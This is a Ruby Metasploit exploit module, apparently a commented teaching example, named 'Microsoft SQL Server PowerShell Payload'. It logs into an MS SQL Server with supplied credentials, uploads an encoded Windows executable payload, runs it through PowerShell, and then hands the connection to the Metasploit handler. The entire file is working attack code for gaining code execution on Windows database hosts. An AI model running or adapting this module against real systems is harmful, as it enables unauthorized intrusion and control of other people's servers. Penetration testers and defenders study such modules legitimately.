# modules/exploits/windows/mssql/mssql_payload.rb
# mssql_powershell.rb
require 'msf/core' #require core libraries

class Metasploit < Msf::Exploit::Remote #define this as a remote exploit
    Rank = ExcellentRanking #reliable exploit ranking
    include Msf::Exploit::Remote::MSSQL #include the mssql.rb library

    def initialize(info = {}) #initialize the basic template
        super(update_info(info,
            'Name'=>'Microsoft SQL Server PowerShell Payload',
            'Description'=>%{
                This module will deliver our payload through Microsoft PowerShell
                using MSSQL based attack vectors.
            },
            'Author'=>['David Kennedy "ReL1K" <kennedyd013[at]gmail.com>'],
            'License'=>MSF_LICENSE,
            'Version'=>'$Revision: 8771 $',
            'References'=>
            [
                ['URL','http://wwww.secmaniac.com']
            ],
            'Platform'=>'win', # target only windows
            'Targets'=>
            [
                ['Automatic',{}], # automatic targeting
            ],
            'DefaultTarget'=>0
            ))
        register_options( # register options for the user to pick from
        [
            OptBool.new('UsePowerShell',[false, "Use PowerShell as payload delivery method instead",true]), # default to PowerShell
        ])
    end

    def exploit # define our exploit here; it does nothing at this point
        # if u/n and p/w didn't work throw error
        if(not mssql_login_datastore)
            print_status("Invalid SQL Server credentials")
            return
        end
        # use powershell method for payload delivery
        if(datastore['UsePowerShell'])
            powershell_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded))
        end
        
        handler # call the Metasploit handler
        disconnect # after handler disconnect
    end
end